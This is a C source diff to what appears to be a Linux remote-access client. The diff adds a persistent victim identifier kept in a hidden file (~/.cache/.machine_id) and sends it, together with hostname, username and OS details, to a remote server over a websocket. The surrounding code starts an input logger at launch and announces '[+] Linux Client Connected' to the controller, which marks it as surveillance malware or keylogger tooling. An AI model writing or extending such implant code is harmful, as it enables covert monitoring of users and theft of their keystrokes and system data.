@@ -41,6 +41,7 @@ char g_server_path[256] = "/";
 int g_sock = -1;
 char g_hostname[256];
 char g_username[256];
+char g_client_id[64];  // Unique client identifier (persisted)
 char g_current_dir[4096];
 volatile int g_connected = 0;
 volatile int g_should_exit = 0;
@@ -298,6 +299,60 @@ void send_websocket_ping() {
         ping_frame[2 + i] = rand() % 256;
     }
     send(g_sock, ping_frame, 6, 0);
+}
+
+// Generate or load unique client ID (persisted in hidden file)
+void init_client_id() {
+    char* home = getenv("HOME");
+    char id_file[4096];
+    
+    if (!home) {
+        // Fallback: generate random ID (not persisted)
+        snprintf(g_client_id, sizeof(g_client_id), "%08lX%08lX", 
+                 (unsigned long)time(NULL), (unsigned long)getpid());
+        return;
+    }
+    
+    // Hidden directory for ID file
+    char id_dir[4096];
+    snprintf(id_dir, sizeof(id_dir), "%s/.cache", home);
+    mkdir(id_dir, 0700);
+    
+    snprintf(id_file, sizeof(id_file), "%s/.machine_id", id_dir);
+    
+    // Try to read existing ID
+    FILE* f = fopen(id_file, "r");
+    if (f) {
+        if (fgets(g_client_id, 32, f)) {
+            // Remove newline
+            g_client_id[strcspn(g_client_id, "\n")] = 0;
+            if (strlen(g_client_id) >= 16) {
+                fclose(f);
+                return;
+            }
+        }
+        fclose(f);
+    }
+    
+    // Generate new unique ID
+    struct stat st;
+    unsigned long dev_id = 0;
+    if (stat("/", &st) == 0) {
+        dev_id = st.st_dev;
+    }
+    
+    snprintf(g_client_id, sizeof(g_client_id), "%08lX%08lX%08lX%04X",
+             dev_id,
+             (unsigned long)time(NULL),
+             (unsigned long)getpid(),
+             (unsigned int)(rand() & 0xFFFF));
+    
+    // Save for persistence
+    f = fopen(id_file, "w");
+    if (f) {
+        fprintf(f, "%s\n", g_client_id);
+        fclose(f);
+    }
 }
 
 void* ping_thread_func(void* arg) {
@@ -1399,6 +1454,7 @@ void send_sysinfo() {
         "\n=== System Information ===\n"
         "Hostname: %s\n"
         "Username: %s\n"
+        "ClientID: %s\n"
         "OS: %s %s\n"
         "Kernel: %s\n"
         "Architecture: %s\n"
@@ -1408,6 +1464,7 @@ void send_sysinfo() {
         "===========================\n\n",
         g_hostname,
         g_username,
+        g_client_id,
         uts.sysname, uts.release,
         uts.version,
         uts.machine,
@@ -1837,9 +1894,10 @@ void handle_session() {
     snprintf(connect_msg, sizeof(connect_msg),
         "\n[+] Linux Client Connected\n"
         "[+] Host: %s | User: %s\n"
+        "[+] ClientID: %s\n"
         "[+] OS: %s %s (%s)\n"
         "[+] Directory: %s\n\n",
-        g_hostname, g_username,
+        g_hostname, g_username, g_client_id,
         uts.sysname, uts.release, uts.machine,
         g_current_dir
     );
@@ -1931,6 +1989,9 @@ int main(int argc, char* argv[]) {
     getcwd(g_current_dir, sizeof(g_current_dir));
     
     g_session_id = getpid() ^ time(NULL);
+    
+    // Initialize unique client ID
+    init_client_id();
     
     // Try to start input logger
     start_inputlog();
